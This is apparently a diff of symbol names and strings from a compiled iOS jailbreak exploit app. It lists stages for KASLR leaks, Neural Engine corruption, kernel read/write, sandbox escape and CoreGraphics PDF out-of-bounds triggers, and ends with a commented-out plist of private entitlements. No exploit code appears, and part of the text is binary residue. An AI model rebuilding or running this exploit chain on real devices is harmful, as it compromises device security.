+thhhhhhXhXXXhhhXdXhXXX
+_OBJC_CLASS_$_AppDelegate
+_OBJC_CLASS_$_JBViewController
+_OBJC_CLASS_$_SceneDelegate
+_OBJC_CLASS_$_StageCell
+_OBJC_METACLASS_$_AppDelegate
+_OBJC_METACLASS_$_JBViewController
+_OBJC_METACLASS_$_SceneDelegate
+_OBJC_METACLASS_$_StageCell
+__mh_execute_header
+_g_log_cb
+_main
+_nj_86950_force_reset
+_nj_86950_render_built_trigger_public
+_nj_86950_render_raw_public
+_nj_entry_112611_child_sweep
+_nj_entry_112611_coord_offset_sweep
+_nj_entry_112611_far_correlate
+_nj_entry_112611_far_direct_read
+_nj_entry_112611_far_hijack
+_nj_entry_112611_fixed_map_groom
+_nj_entry_112611_geometry_sweep
+_nj_entry_112611_groom_near
+_nj_entry_112611_inc16_probe
+_nj_entry_112611_lr_scan
+_nj_entry_112611_lr_scan_geo
+_nj_entry_112611_lr_scan_v2
+_nj_entry_112611_lr_scan_vla_size
+_nj_entry_112611_malloc_groom
+_nj_entry_112611_manual_R
+_nj_entry_112611_manual_c0
+_nj_entry_112611_manual_c0_c1
+_nj_entry_112611_mega_sweep
+_nj_entry_112611_micro_sweep
+_nj_entry_112611_nc_sweep
+_nj_entry_112611_pc_diag
+_nj_entry_112611_r1_c0_sweep
+_nj_entry_112611_r_micro
+_nj_entry_112611_r_sweep
+_nj_entry_112611_shading_exploit
+_nj_entry_112611_shading_test
+_nj_entry_112611_stack_pivot
+_nj_entry_112611_stack_probe
+_nj_entry_112611_try_all
+_nj_entry_112611_user_far_hijack
+_nj_entry_112611_variants
+_nj_entry_112611_width_control
+_nj_entry_86950_bbox_sweep
+_nj_entry_86950_cg_groom
+_nj_entry_86950_child_sweep
+_nj_entry_86950_diag
+_nj_entry_86950_exploit_v10
+_nj_entry_86950_exploit_v11
+_nj_entry_86950_exploit_v12
+_nj_entry_86950_exploit_v2
+_nj_entry_86950_exploit_v5
+_nj_entry_86950_exploit_v7
+_nj_entry_86950_groom_dump
+_nj_entry_86950_groom_huge
+_nj_entry_86950_groom_payload
+_nj_entry_86950_stack_mode
+_nj_entry_86950_test
+_nj_entry_86950_width_control
+_nj_entry_full_chain
+_nj_kread64
+_nj_krw_set_tfp0
+_nj_kwrite64
+_nj_oob_worker_112611
+_nj_oob_worker_86950
+_nj_oob_worker_main
+_nj_render_shading_for_child
+_nj_render_trigger_for_child
+_nj_set_log_cb
+_nj_shading_build_pdf_public
+_nj_shading_force_reset
+_nj_shading_render_raw_public
+_nj_stage0_kaslr_leaks
+_nj_stage1_ane_corrupt
+_nj_stage1_child_entry
+_nj_stage2_build_krw
+_nj_stage2_build_krw_from_leaks
+_nj_stage3_sandbox_escape
+_nj_stage3_sandbox_escape_to
+_nj_stage4_install_jb
+_CFDataCreate
+_CFDictionaryCreate
+_CFDictionaryCreateMutable
+_CFDictionaryGetValue
+_CFDictionarySetValue
+_CFNumberCreate
+_CFRelease
+_CFStringGetCString
+_CGBitmapContextCreate
+_CGBitmapContextGetData
+_CGColorSpaceCreateDeviceRGB
+_CGColorSpaceRelease
+_CGContextDrawPDFPage
+_CGContextRelease
+_CGDataProviderCreateWithCFData
+_CGDataProviderRelease
+_CGImageRelease
+_CGImageSourceCreateThumbnailAtIndex
+_CGImageSourceCreateWithDataProvider
+_CGPDFDocumentCreateWithProvider
+_CGPDFDocumentGetPage
+_CGPDFDocumentRelease
+_CGPDFPageGetBoxRect
+_CGRectZero
+_IOConnectCallStructMethod
+_IOIteratorNext
+_IONotificationPortCreate
+_IONotificationPortDestroy
+_IONotificationPortSetDispatchQueue
+_IOObjectGetClass
+_IOObjectRelease
+_IORegistryEntryCreateCFProperties
+_IOServiceAddInterestNotification
+_IOServiceClose
+_IOServiceGetMatchingService
+_IOServiceGetMatchingServices
+_IOServiceMatching
+_IOServiceOpen
+_IOSurfaceCreate
+_IOSurfaceGetBaseAddress
+_IOSurfaceGetID
+_IOSurfaceLock
+_IOSurfaceUnlock
+_NSStringFromClass
+_OBJC_CLASS_$_NSArray
+_OBJC_CLASS_$_NSConstantArray
+_OBJC_CLASS_$_NSDate
+_OBJC_CLASS_$_NSDateFormatter
+_OBJC_CLASS_$_NSIndexPath
+_OBJC_CLASS_$_NSLayoutConstraint
+_OBJC_CLASS_$_NSMutableArray
+_OBJC_CLASS_$_NSMutableString
+_OBJC_CLASS_$_NSString
+_OBJC_CLASS_$_UIActivityIndicatorView
+_OBJC_CLASS_$_UIAlertAction
+_OBJC_CLASS_$_UIAlertController
+_OBJC_CLASS_$_UIButton
+_OBJC_CLASS_$_UIColor
+_OBJC_CLASS_$_UIFont
+_OBJC_CLASS_$_UILabel
+_OBJC_CLASS_$_UIResponder
+_OBJC_CLASS_$_UISceneConfiguration
+_OBJC_CLASS_$_UITableView
+_OBJC_CLASS_$_UITableViewCell
+_OBJC_CLASS_$_UITextField
+_OBJC_CLASS_$_UITextView
+_OBJC_CLASS_$_UIViewController
+_OBJC_CLASS_$_UIWindow
+_OBJC_CLASS_$_UIWindowScene
+_OBJC_METACLASS_$_NSObject
+_OBJC_METACLASS_$_UIResponder
+_OBJC_METACLASS_$_UITableViewCell
+_OBJC_METACLASS_$_UIViewController
+_UIApplicationMain
+_UIFontWeightMedium
+__NSConcreteGlobalBlock
+__NSConcreteStackBlock
+__NSGetExecutablePath
+__Unwind_Resume
+___CFConstantStringClassReference
+___chkstk_darwin
+___error
+___memcpy_chk
+___objc_personality_v0
+___sprintf_chk
+___stack_chk_fail
+___stack_chk_guard
+___stderrp
+__dispatch_main_q
+__exit
+__objc_empty_cache
+_access
+_aio_cancel
+_aio_read
+_atof
+_atoi
+_atol
+_bzero
+_calloc
+_close
+_closedir
+_dispatch_async
+_dispatch_once
+_dispatch_queue_create
+_dispatch_semaphore_create
+_dispatch_semaphore_signal
+_dispatch_semaphore_wait
+_dispatch_time
+_dladdr
+_dlclose
+_dlerror
+_dlopen
+_dlsym
+_environ
+_fclose
+_fopen
+_fork
+_fprintf
+_fread
+_free
+_fscanf
+_fseek
+_fsync
+_ftell
+_ftruncate
+_fwrite
+_getenv
+_getpid
+_kCFAllocatorDefault
+_kCFBooleanTrue
+_kCFTypeDictionaryKeyCallBacks
+_kCFTypeDictionaryValueCallBacks
+_kCGImageSourceCreateThumbnailFromImageAlways
+_kCGImageSourceThumbnailMaxPixelSize
+_kill
+_kqueue
+_mach_msg
+_mach_port_allocate
+_mach_port_deallocate
+_mach_port_destroy
+_mach_port_insert_right
+_mach_task_self_
+_mach_vm_allocate
+_mach_vm_deallocate
+_mach_vm_map
+_mach_vm_protect
+_mach_vm_read_overwrite
+_mach_vm_remap
+_mach_vm_write
+_madvise
+_malloc
+_memcpy
+_memset
+_mkdir
+_mmap
+_munmap
+_objc_alloc
+_objc_alloc_init
+_objc_autoreleasePoolPop
+_objc_autoreleasePoolPush
+_objc_autoreleaseReturnValue
+_objc_copyWeak
+_objc_destroyWeak
+_objc_initWeak
+_objc_loadWeakRetained
+_objc_msgSend
+_objc_msgSendSuper2
+_objc_opt_class
+_objc_opt_isKindOfClass
+_objc_opt_new
+_objc_opt_respondsToSelector
+_objc_release
+_objc_retain
+_objc_retainAutorelease
+_objc_retainAutoreleasedReturnValue
+_objc_storeStrong
+_objc_storeWeak
+_open
+_opendir
+_posix_spawn
+_posix_spawnattr_destroy
+_posix_spawnattr_init
+_posix_spawnattr_setflags
+_posix_spawnattr_setsigdefault
+_posix_spawnattr_setsigmask
+_proc_pidfdinfo
+_pthread_equal
+_pthread_self
+_raise
+_read
+_readdir
+_realloc
+_setenv
+_sigaction
+_siglongjmp
+_signal
+_sigsetjmp
+_snprintf
+_sprintf
+_stat
+_strcmp
+_strerror
+_strlen
+_strrchr
+_strstr
+_strtoull
+_symlink
+_unlink
+_unsetenv
+_usleep
+_vm_allocate
+_vm_deallocate
+_vm_region_64
+_vm_remap
+_vsnprintf
+_waitpid
+_write
+_nj_groom_shaped_refill_v7
+_nj_render_with_recovery
+_nj_v12_vm_groom_holes
+_nj_build_pdf
+_nj_render_guard_none
+_nj_crash_handler
+_sb_printf
+_nj_buf_printf
+_nj_build_shading_pdf
+_nj_shading_groom
+_nj_shading_render_recovery
+_nj_shading_scan_corruption
+_nj_shading_render_raw
+_nj_build_shading_pdf_ex
+_nj_shading_crash_handler
+_nj_sig_puthex
+_nj_shading_run_once_ex
+_nj_worker_install_handlers
+_nj_mg_child_setup
+_nj_mg_child_scan
+_nj_shm_parent_setup
+_nj_run_worker_inproc
+_nj_shm_scan_groom
+_nj_shm_path
+_nj_worker_crash_handler
+_log_msg
+_console_security_callback
+_inprocess_scaler_attempt
+_groom_heap
+_scan_victims
+_open_ane_client
+_ane_trigger_oob
+_sbx_load
+_sbx_toctou_escape
+-[StageCell initWithStyle:reuseIdentifier:]
+-[StageCell setStage:status:running:]
+-[StageCell stageLabel]
+-[StageCell setStageLabel:]
+-[StageCell statusLabel]
+-[StageCell setStatusLabel:]
+-[StageCell spinner]
+-[StageCell setSpinner:]
+-[StageCell .cxx_destruct]
+-[JBViewController viewDidLoad]
+___31-[JBViewController viewDidLoad]_block_invoke
+-[JBViewController modeTitleForIndex:]
+-[JBViewController didTapMode:]
+___31-[JBViewController didTapMode:]_block_invoke
+___copy_helper_block_e8_32w
+___destroy_helper_block_e8_32w
+-[JBViewController appendLog:]
+___30-[JBViewController appendLog:]_block_invoke
+___30-[JBViewController appendLog:]_block_invoke_2
+___copy_helper_block_e8_32s
+___destroy_helper_block_e8_32s
+___copy_helper_block_e8_32s40s
+___destroy_helper_block_e8_32s40s
+-[JBViewController updateStage:status:running:]
+___47-[JBViewController updateStage:status:running:]_block_invoke
+-[JBViewController didTapRun:]
+___30-[JBViewController didTapRun:]_block_invoke
+_log_callback
+___30-[JBViewController didTapRun:]_block_invoke_2
+-[JBViewController runOOB86950]
+-[JBViewController runOOB112611]
+-[JBViewController run86950CGGroom]
+-[JBViewController runGroomDump]
+-[JBViewController runGroomPayload]
+-[JBViewController runSMARt]
+-[JBViewController runDiag]
+-[JBViewController run86950Test]
+-[JBViewController run86950Width]
+-[JBViewController run86950BBox]
+-[JBViewController run86950Stack]
+-[JBViewController run86950Huge]
+-[JBViewController run112611Test]
+-[JBViewController runLRScan]
+-[JBViewController runGeoSweep]
+-[JBViewController runUserFar]
+-[JBViewController runFarRead]
+-[JBViewController runInc16]
+-[JBViewController runWidthCtl]
+-[JBViewController runCoordOff]
+-[JBViewController runStackProbe]
+-[JBViewController runKASLR]
+-[JBViewController runANE]
+-[JBViewController runKRW]
+-[JBViewController runSandbox]
+-[JBViewController runInstall]
+-[JBViewController runFullChain]
+-[JBViewController didTapReset:]
+___32-[JBViewController didTapReset:]_block_invoke
+-[JBViewController tableView:numberOfRowsInSection:]
+-[JBViewController tableView:cellForRowAtIndexPath:]
+-[JBViewController tableView]
+-[JBViewController setTableView:]
+-[JBViewController logView]
+-[JBViewController setLogView:]
+-[JBViewController runButton]
+-[JBViewController setRunButton:]
+-[JBViewController resetButton]
+-[JBViewController setResetButton:]
+-[JBViewController modeButton]
+-[JBViewController setModeButton:]
+-[JBViewController modeNames]
+-[JBViewController setModeNames:]
+-[JBViewController selectedMode]
+-[JBViewController setSelectedMode:]
+-[JBViewController targetAddrField]
+-[JBViewController setTargetAddrField:]
+-[JBViewController stageStatuses]
+-[JBViewController setStageStatuses:]
+-[JBViewController isRunning]
+-[JBViewController setIsRunning:]
+-[JBViewController jbQueue]
+-[JBViewController setJbQueue:]
+-[JBViewController leak_reg]
+-[JBViewController setLeak_reg:]
+-[JBViewController leak_aio]
+-[JBViewController setLeak_aio:]
+-[JBViewController leak_surf]
+-[JBViewController setLeak_surf:]
+-[JBViewController victim_port]
+-[JBViewController setVictim_port:]
+-[JBViewController tfp0]
+-[JBViewController setTfp0:]
+-[JBViewController kslide]
+-[JBViewController setKslide:]
+-[JBViewController .cxx_destruct]
+-[SceneDelegate scene:willConnectToSession:options:]
+-[SceneDelegate window]
+-[SceneDelegate setWindow:]
+-[SceneDelegate .cxx_destruct]
+-[AppDelegate application:configurationForConnectingSceneSession:options:]
+-[JBViewController viewDidLoad].cold.1
+_objc_msgSend$CGColor
+_objc_msgSend$UTF8String
+_objc_msgSend$actionWithTitle:style:handler:
+_objc_msgSend$activateConstraints:
+_objc_msgSend$addAction:
+_objc_msgSend$addSubview:
+_objc_msgSend$addTarget:action:forControlEvents:
+_objc_msgSend$alertControllerWithTitle:message:preferredStyle:
+_objc_msgSend$appendLog:
+_objc_msgSend$appendString:
+_objc_msgSend$arrayWithObjects:
+_objc_msgSend$arrayWithObjects:count:
+_objc_msgSend$boldSystemFontOfSize:
+_objc_msgSend$bottomAnchor
+_objc_msgSend$bounds
+_objc_msgSend$buttonWithType:
+_objc_msgSend$centerYAnchor
+_objc_msgSend$colorWithWhite:alpha:
+_objc_msgSend$constraintEqualToAnchor:
+_objc_msgSend$constraintEqualToAnchor:constant:
+_objc_msgSend$constraintEqualToConstant:
+_objc_msgSend$contentView
+_objc_msgSend$count
+_objc_msgSend$date
+_objc_msgSend$dequeueReusableCellWithIdentifier:forIndexPath:
+_objc_msgSend$endEditing:
+_objc_msgSend$fontWithName:size:
+_objc_msgSend$hasPrefix:
+_objc_msgSend$heightAnchor
+_objc_msgSend$indexPathForRow:inSection:
+_objc_msgSend$initWithActivityIndicatorStyle:
+_objc_msgSend$initWithFrame:style:
+_objc_msgSend$initWithName:sessionRole:
+_objc_msgSend$initWithWindowScene:
+_objc_msgSend$isRunning
+_objc_msgSend$jbQueue
+_objc_msgSend$labelColor
+_objc_msgSend$layer
+_objc_msgSend$leadingAnchor
+_objc_msgSend$leak_reg
+_objc_msgSend$leak_surf
+_objc_msgSend$length
+_objc_msgSend$lightGrayColor
+_objc_msgSend$localizedStringFromDate:dateStyle:timeStyle:
+_objc_msgSend$logView
+_objc_msgSend$makeKeyAndVisible
+_objc_msgSend$modeButton
+_objc_msgSend$modeNames
+_objc_msgSend$modeTitleForIndex:
+_objc_msgSend$objectAtIndexedSubscript:
+_objc_msgSend$popoverPresentationController
+_objc_msgSend$presentViewController:animated:completion:
+_objc_msgSend$rangeOfString:options:range:
+_objc_msgSend$registerClass:forCellReuseIdentifier:
+_objc_msgSend$reloadData
+_objc_msgSend$reloadRowsAtIndexPaths:withRowAnimation:
+_objc_msgSend$replaceCharactersInRange:withString:
+_objc_msgSend$resetButton
+_objc_msgSend$role
+_objc_msgSend$row
+_objc_msgSend$run112611Test
+_objc_msgSend$run86950BBox
+_objc_msgSend$run86950CGGroom
+_objc_msgSend$run86950Huge
+_objc_msgSend$run86950Stack
+_objc_msgSend$run86950Test
+_objc_msgSend$run86950Width
+_objc_msgSend$runANE
+_objc_msgSend$runButton
+_objc_msgSend$runCoordOff
+_objc_msgSend$runDiag
+_objc_msgSend$runFarRead
+_objc_msgSend$runFullChain
+_objc_msgSend$runGeoSweep
+_objc_msgSend$runGroomDump
+_objc_msgSend$runGroomPayload
+_objc_msgSend$runInc16
+_objc_msgSend$runInstall
+_objc_msgSend$runKASLR
+_objc_msgSend$runKRW
+_objc_msgSend$runLRScan
+_objc_msgSend$runOOB112611
+_objc_msgSend$runOOB86950
+_objc_msgSend$runSMARt
+_objc_msgSend$runSandbox
+_objc_msgSend$runStackProbe
+_objc_msgSend$runUserFar
+_objc_msgSend$runWidthCtl
+_objc_msgSend$safeAreaLayoutGuide
+_objc_msgSend$scrollRangeToVisible:
+_objc_msgSend$secondaryLabelColor
+_objc_msgSend$selectedMode
+_objc_msgSend$setAutocapitalizationType:
+_objc_msgSend$setAutocorrectionType:
+_objc_msgSend$setBackgroundColor:
+_objc_msgSend$setBorderColor:
+_objc_msgSend$setBorderStyle:
+_objc_msgSend$setBorderWidth:
+_objc_msgSend$setContentEdgeInsets:
+_objc_msgSend$setContentHorizontalAlignment:
+_objc_msgSend$setCornerRadius:
+_objc_msgSend$setDataSource:
+_objc_msgSend$setDelegate:
+_objc_msgSend$setEditable:
+_objc_msgSend$setEnabled:
+_objc_msgSend$setFont:
+_objc_msgSend$setHidesWhenStopped:
+_objc_msgSend$setIsRunning:
+_objc_msgSend$setJbQueue:
+_objc_msgSend$setKslide:
+_objc_msgSend$setLeak_aio:
+_objc_msgSend$setLeak_reg:
+_objc_msgSend$setLeak_surf:
+_objc_msgSend$setLogView:
+_objc_msgSend$setModeButton:
+_objc_msgSend$setModeNames:
+_objc_msgSend$setObject:atIndexedSubscript:
+_objc_msgSend$setPlaceholder:
+_objc_msgSend$setResetButton:
+_objc_msgSend$setRootViewController:
+_objc_msgSend$setRowHeight:
+_objc_msgSend$setRunButton:
+_objc_msgSend$setSelectable:
+_objc_msgSend$setSelectedMode:
+_objc_msgSend$setSourceRect:
+_objc_msgSend$setSourceView:
+_objc_msgSend$setSpinner:
+_objc_msgSend$setStage:status:running:
+_objc_msgSend$setStageLabel:
+_objc_msgSend$setStageStatuses:
+_objc_msgSend$setStatusLabel:
+_objc_msgSend$setString:
+_objc_msgSend$setTableView:
+_objc_msgSend$setTargetAddrField:
+_objc_msgSend$setText:
+_objc_msgSend$setTextAlignment:
+_objc_msgSend$setTextColor:
+_objc_msgSend$setTfp0:
+_objc_msgSend$setTitle:forState:
+_objc_msgSend$setTitleColor:forState:
+_objc_msgSend$setTranslatesAutoresizingMaskIntoConstraints:
+_objc_msgSend$setVictim_port:
+_objc_msgSend$setWindow:
+_objc_msgSend$spinner
+_objc_msgSend$stageLabel
+_objc_msgSend$stageStatuses
+_objc_msgSend$startAnimating
+_objc_msgSend$statusLabel
+_objc_msgSend$stopAnimating
+_objc_msgSend$string
+_objc_msgSend$stringByAppendingString:
+_objc_msgSend$stringWithFormat:
+_objc_msgSend$stringWithUTF8String:
+_objc_msgSend$substringToIndex:
+_objc_msgSend$systemBackgroundColor
+_objc_msgSend$systemBlueColor
+_objc_msgSend$systemFontOfSize:
+_objc_msgSend$systemFontOfSize:weight:
+_objc_msgSend$systemGrayColor
+_objc_msgSend$systemGreenColor
+_objc_msgSend$systemOrangeColor
+_objc_msgSend$systemRedColor
+_objc_msgSend$tableView
+_objc_msgSend$targetAddrField
+_objc_msgSend$text
+_objc_msgSend$titleLabel
+_objc_msgSend$topAnchor
+_objc_msgSend$trailingAnchor
+_objc_msgSend$updateStage:status:running:
+_objc_msgSend$victim_port
+_objc_msgSend$view
+_objc_msgSend$whiteColor
+_objc_msgSend$widthAnchor
+_objc_msgSend$window
+__OBJC_$_INSTANCE_METHODS_AppDelegate
+__OBJC_$_INSTANCE_METHODS_JBViewController
+__OBJC_$_INSTANCE_METHODS_SceneDelegate
+__OBJC_$_INSTANCE_METHODS_StageCell
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_NSObject
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_NSObject
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UIApplicationDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UISceneDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UIScrollViewDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UITableViewDataSource
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UITableViewDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UITextFieldDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_OPT_UIWindowSceneDelegate
+__OBJC_$_PROTOCOL_INSTANCE_METHODS_UITableViewDataSource
+_nj_entry_86950_exploit_v2.sz_tab
+_nj_entry_86950_exploit_v2.str_tab
+_nj_entry_86950_exploit_v5.tf_tab
+_nj_entry_86950_exploit_v5.cnt_tab
+_nj_trigger_tf_512
+_nj_trigger_tf_256
+_nj_trigger_tf_128
+_nj_trigger_tf_64
+_nj_trigger_tf_32
+_nj_trigger_tf_16
+_nj_trigger_tf_8
+_nj_trigger_tf_4
+_nj_trigger_tf_2
+_nj_entry_86950_exploit_v7.sz_tab
+_nj_entry_86950_exploit_v7.pos_tab
+_nj_entry_86950_exploit_v10.sz_tab
+_nj_entry_86950_exploit_v11.rsz_tab
+_nj_entry_86950_exploit_v11.cnt_tab
+_nj_entry_86950_cg_groom.dims
+_trigger_86950_real_pdf
+_nj_entry_112611_r_sweep.Rs
+_nj_entry_112611_mega_sweep.c0s
+_nj_entry_112611_mega_sweep.Rs
+_nj_entry_112611_nc_sweep.nc_val
+_nj_entry_112611_nc_sweep.Rs
+_nj_entry_112611_malloc_groom.sizes
+_nj_entry_112611_far_correlate.offs
+_nj_entry_112611_r1_c0_sweep.c0s
+_nj_entry_112611_lr_scan.Rs
+_nj_entry_112611_lr_scan_v2.Rs
+_nj_entry_112611_lr_scan_geo.Rs
+_nj_entry_112611_coord_offset_sweep.coords
+_nj_shading_aim_probe.Ts
+_nj_shading_sweep_R.Rs
+_nj_cs_tf_list
+_nj_sh_rs_list
+_nj_entry_112611_child_sweep.marks
+_nj_entry_112611_child_sweep.mark_rs
+_nj_entry_112611_child_sweep.tgt_rs
+_nj_build_type1_font.hx
+_nj_sig_puthex.hx
+GCC_except_table12
+_nj_entry_112611_micro_sweep.tests
+_nj_entry_112611_nc_sweep.css
+_nj_entry_112611_nc_sweep.names
+_nj_entry_112611_variants.tests
+_nj_entry_112611_geometry_sweep.tests
+_nj_entry_112611_lr_scan_vla_size.tests
+_nj_shading_batch_init.vars
+_nj_shading_c0_sweep.cfgs
+_nj_shading_payload_probe.cfgs
+___block_descriptor_32_e5_v8
+___block_literal_global
+___block_descriptor_48_e8_32w_e23_v16
+"UIAlertAction"8l
+___block_descriptor_40_e8_32s_e5_v8
+___block_descriptor_48_e8_32s40s_e5_v8
+___block_descriptor_56_e8_32s40s_e5_v8
+___block_descriptor_56_e8_32s_e5_v8
+___block_literal_global.326
+__OBJC_LABEL_PROTOCOL_$_NSObject
+__OBJC_LABEL_PROTOCOL_$_UITableViewDataSource
+__OBJC_LABEL_PROTOCOL_$_UIScrollViewDelegate
+__OBJC_LABEL_PROTOCOL_$_UITableViewDelegate
+__OBJC_LABEL_PROTOCOL_$_UITextFieldDelegate
+__OBJC_LABEL_PROTOCOL_$_UISceneDelegate
+__OBJC_LABEL_PROTOCOL_$_UIWindowSceneDelegate
+__OBJC_LABEL_PROTOCOL_$_UIApplicationDelegate
+__OBJC_METACLASS_RO_$_StageCell
+__OBJC_$_INSTANCE_VARIABLES_StageCell
+__OBJC_$_PROP_LIST_StageCell
+__OBJC_CLASS_RO_$_StageCell
+__OBJC_$_PROP_LIST_NSObject
+__OBJC_$_PROTOCOL_METHOD_TYPES_NSObject
+__OBJC_$_PROTOCOL_REFS_UITableViewDataSource
+__OBJC_$_PROTOCOL_METHOD_TYPES_UITableViewDataSource
+__OBJC_$_PROTOCOL_REFS_UIScrollViewDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UIScrollViewDelegate
+__OBJC_$_PROTOCOL_REFS_UITableViewDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UITableViewDelegate
+__OBJC_$_PROTOCOL_REFS_UITextFieldDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UITextFieldDelegate
+__OBJC_CLASS_PROTOCOLS_$_JBViewController
+__OBJC_METACLASS_RO_$_JBViewController
+__OBJC_$_INSTANCE_VARIABLES_JBViewController
+__OBJC_$_PROP_LIST_JBViewController
+__OBJC_CLASS_RO_$_JBViewController
+__OBJC_$_PROTOCOL_REFS_UISceneDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UISceneDelegate
+__OBJC_$_PROTOCOL_REFS_UIWindowSceneDelegate
+__OBJC_$_PROP_LIST_UIWindowSceneDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UIWindowSceneDelegate
+__OBJC_CLASS_PROTOCOLS_$_SceneDelegate
+__OBJC_METACLASS_RO_$_SceneDelegate
+__OBJC_$_INSTANCE_VARIABLES_SceneDelegate
+__OBJC_$_PROP_LIST_SceneDelegate
+__OBJC_CLASS_RO_$_SceneDelegate
+__OBJC_$_PROTOCOL_REFS_UIApplicationDelegate
+__OBJC_$_PROP_LIST_UIApplicationDelegate
+__OBJC_$_PROTOCOL_METHOD_TYPES_UIApplicationDelegate
+__OBJC_CLASS_PROTOCOLS_$_AppDelegate
+__OBJC_METACLASS_RO_$_AppDelegate
+__OBJC_$_PROP_LIST_AppDelegate
+__OBJC_CLASS_RO_$_AppDelegate
+_OBJC_IVAR_$_StageCell._stageLabel
+_OBJC_IVAR_$_StageCell._statusLabel
+_OBJC_IVAR_$_StageCell._spinner
+_OBJC_IVAR_$_JBViewController._tableView
+_OBJC_IVAR_$_JBViewController._logView
+_OBJC_IVAR_$_JBViewController._runButton
+_OBJC_IVAR_$_JBViewController._resetButton
+_OBJC_IVAR_$_JBViewController._modeButton
+_OBJC_IVAR_$_JBViewController._modeNames
+_OBJC_IVAR_$_JBViewController._selectedMode
+_OBJC_IVAR_$_JBViewController._targetAddrField
+_OBJC_IVAR_$_JBViewController._stageStatuses
+_OBJC_IVAR_$_JBViewController._isRunning
+_OBJC_IVAR_$_JBViewController._jbQueue
+_OBJC_IVAR_$_JBViewController._leak_reg
+_OBJC_IVAR_$_JBViewController._leak_aio
+_OBJC_IVAR_$_JBViewController._leak_surf
+_OBJC_IVAR_$_JBViewController._victim_port
+_OBJC_IVAR_$_JBViewController._tfp0
+_OBJC_IVAR_$_JBViewController._kslide
+_OBJC_IVAR_$_SceneDelegate._window
+_g_groom_sz
+_g_sh_groom_sz
+_g_crash_fd
+_g_shm_fd
+__OBJC_PROTOCOL_$_NSObject
+__OBJC_PROTOCOL_$_UITableViewDataSource
+__OBJC_PROTOCOL_$_UIScrollViewDelegate
+__OBJC_PROTOCOL_$_UITableViewDelegate
+__OBJC_PROTOCOL_$_UITextFieldDelegate
+__OBJC_PROTOCOL_$_UISceneDelegate
+__OBJC_PROTOCOL_$_UIWindowSceneDelegate
+__OBJC_PROTOCOL_$_UIApplicationDelegate
+_g_cg_torn
+_g_crash_addr
+_g_crash_lr
+_g_crash_pc
+_g_v11_vm_n
+_g_v11_vm_bases
+_g_v11_vm_sizes
+_g_groom_ptrs
+_g_sh_sz
+_g_sh_count
+_g_sh_ptrs
+_g_crash_sig
+_nj_render_with_recovery.g_handlers_once
+_g_jb
+_g_jb_thread
+_g_old_segv
+_g_old_bus
+_g_old_ill
+_g_old_trap
+_g_old_abrt
+_g_cg_torn
+_g_sh_far
+_g_sh_pc
+_g_sh_lr
+_g_sh_sp
+_g_sh_x
+_nj_shading_batch_step.names
+_g_sh_groom
+_g_sh_groom_n
+_g_sh_sig
+_g_sh_addr
+_g_sh_render_tid
+_g_sh_jb
+_g_sh_old_segv
+_g_sh_old_bus
+_g_sh_old_ill
+_g_sh_up
+_g_shm
+_g_worker_jmp_valid
+_g_worker_jmp
+_g_mg
+_g_groom
+_g_shm_path
+_nj_shm_path.bindir
+_g_got_65371
+_g_leaked_65371
+_g_sem_65371
+_g_nports
+_framework_scaler_attempt.diag_buf
+_load_iosa_framework.api.0
+_load_iosa_framework.api.1
+_load_iosa_framework.api.2
+_load_iosa_framework.api.3
+_load_iosa_framework.api.4
+_load_iosa_framework.loaded
+_g_ports
+_g_krw.0
+_g_krw.1
+_g_krw.2
+_sbx_load.api
+_sbx_load.tried
+_g_logBuffer
+_g_logQueue
+_g_sharedVC
+_viewDidLoad.onceToken
+com.example.newjail
+u<-\
+-JuG
+oE=(Q
+VOY"
+V	Fe
+h*4xmzwV~c,
+nwZU
+[R+fr
+o-j?
+T!)Ra
+|n#R
+*wPr
+dV[+
+j<-m
+zm(6
+N^8~&
+o6aj
+ew|<2;
+H1$t
+V~("
+bqEL
+ZD2=0
+5l7c
+|?wf
+Q fl
+jV.w
+Ek>/e>
+fEU;
+j*]ro
+`<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>get-task-allow</key>
+    <true/>
+    
+    <!-- 
+    
+ TrollStore.
+    Sideloadly/AltStore 
+    
+    <key>com.apple.private.security.no-sandbox</key>
+    <true/>
+    <key>platform-application</key>
+    <true/>
+    <key>com.apple.private.skip-library-validation</key>
+    <true/>
+    <key>com.apple.private.ane</key>
+    <true/>
+    <key>com.apple.private.ane.allow</key>
+    <true/>
+    <key>com.apple.private.ane.client</key>
+    <true/>
+    <key>com.apple.private.iokit</key>
+    <true/>
+    <key>com.apple.private.iokit.userclient</key>
+    <true/>
+    <key>com.apple.private.IOSurface</key>
+    <true/>
+    <key>com.apple.private.tcc.manager</key>
+    <true/>
+    <key>com.apple.private.sandbox.profile</key>
+    <true/>
+    -->
+</dict>
+</plist>
+get-task-allow
